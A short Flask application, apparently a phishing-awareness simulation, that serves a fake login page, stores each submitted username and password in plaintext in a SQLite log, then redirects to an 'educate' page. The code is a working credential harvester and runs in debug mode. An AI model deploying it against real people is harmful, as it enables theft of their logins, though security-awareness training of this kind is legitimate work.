from flask import Flask, request, render_template, redirect, url_for
import sqlite3
from datetime import datetime
app = Flask(__name__)
def db_connection():
    conn = sqlite3.connect('phishing_log.db')
    return conn
def set_up_database():
    conn = db_connection()
    with conn:
        # creating table with columns number, username, password and timestamp
        conn.execute('''
            CREATE TABLE IF NOT EXISTS log (
                number INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                timestamp TEXT NOT NULL)
        ''')
    conn.close()
set_up_database()
@app.route('/')
def login_page():
    return render_template('login_page.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    conn = db_connection()
    with conn:
        conn.execute(
            "INSERT INTO log (username, password, timestamp) VALUES (?, ?, ?)",(username, password, timestamp))
    return redirect(url_for('educate'))

@app.route('/educate')
def educate():
    return render_template('educate.html')

if __name__ == '__main__':
    app.run(debug=True)
